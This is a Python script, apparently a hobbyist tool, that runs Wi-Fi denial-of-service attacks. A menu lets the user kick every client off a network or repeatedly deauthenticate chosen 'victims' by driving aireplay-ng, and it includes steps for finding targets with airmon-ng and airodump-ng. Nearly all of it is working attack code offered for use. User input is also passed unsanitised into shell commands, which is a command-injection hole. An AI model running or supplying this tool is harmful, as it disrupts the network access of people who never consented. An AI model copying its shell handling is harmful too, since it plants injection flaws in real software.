import subprocess
import signal
import os.path
from os import path
import sys
import time
import os
from os import system

def clear(): 
    if os.name == 'nt': 
        os.system('cls') 
    else: 
        os.system('clear')

network = '00:00:00:00:00'
victims = []
inter = "wlan0mon"
def banner():
	print ('''
	         _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_
		 _-                                      __      __    ___   ___                  -_      
		 _-   ( ( ( O ) ) )          |   |      |       |  \  |   | |                     -_
		 _-         |                |   | o -- |-- o   |   | |   | '---.                 -_
		 _-         |                |_|_| |    |   |   |__/  |___|  ___|                 -_
		 _-         |                                                  --- script-beast   -_
                 _-                                                                               -_
		 _-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_	  
		 
		 ''')

def signal_handler(signal, frame):
    print ("\nYou pressed Ctrl+C!...... \nExiting..................")
    sys.exit(0)

def deauth_all_clients(net,interface):
    command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
    print ("[+] Deauthenticating all clients in the network")
    time.sleep(2)
    subprocess.call([command], shell=True) #Runs forever

def deauth_client(net, cli,interface):
    print ("\n[+] Deauthenticating {0}\n".format(cli))
    command = ("aireplay-ng --deauth 3 -a {0} -c {1} {2}".format(net, cli, interface))
    subprocess.call([command], shell=True)

def allclient():
	clear()
	banner()
	network = input("Enter the BSSID of The wifi :  ")
	inter = input("Enter the interface (must be in monitor mode) : ")
	chan = input("Enter the of Channel of Wi-Fi : ")
	com = "iwconfig {0} channel {1}".format(inter, chan)
	subprocess.call([com],shell = True)
	clear()
	banner()
	print ("[+] Target Network:\n\t{0}".format(network))
	print ("To stop the DOS attack Press 'CTRL+c'")
	time.sleep(5)
	deauth_all_clients(network , inter)
	sys.exit(1)

def targets():
	clear ()
	banner()
	network = input("Enter the BSSID of The wifi :  ")
	inter = input("Enter the interface (must be in monitor mode) : ")
	chan = input("Enter the of Channel of Wi-Fi : ")
	com = "iwconfig {0} channel {1}".format(inter, chan)
	subprocess.call([com],shell = True)
	size = int(input("Enter the number client :  "))	
	for i in range(0,size):
			victims.append(input( " > "))
	clear()
	banner()
	print ("[+] Target Clients: ")
	for i in range(0, len(victims)):
		print ("\t{0}".format(victims[i]))
	while True:
		for i in range(0, len(victims)):
			deauth_client(network, victims[i],inter)

def intro():
	clear()
	banner()
	print ( '''
			 Open terminal and run 
			 # ifconfig
			  
			 From the list of interface . Select the interface 
			 Then on terminal write 
			 # airmon-ng start (interface name)
			 
			 Now your interface is in moniter mode
			 Your new iterface name : interfacemon
			 Eg. "wlan0" will change to "wlan0mon"
			 Now Run 
			 # airodump-ng (new interface name)
			 
			 From the list select Wi-Fi BSSID , channel (CH) and from below select clients
			 
			 
			 Thanks .............
	       ''') 
clear()
banner()
print ('''
       Welcome ............
	   
	   
	   Menu :- 
	   
	   1. Steps to find :-- BSSID of Wi-Fi , Channel , MAC address of clients and Interface . 
	   2. Dos on whole wifi network
	   3. Dos on selected clients on Wi-Fi networks
	   4. Exit
	   
	    
       ''')

ch = int(input(" >>>>   "))
signal.signal(signal.SIGINT, signal_handler)
if ch == 1 :
	intro();
	time.sleep(3)
	sys.exit()
elif ch == 2 :
	allclient()
elif ch == 3 :
	targets()
else :
	print("Good Bye .............. \nHave a Nice Day .......")
	exit()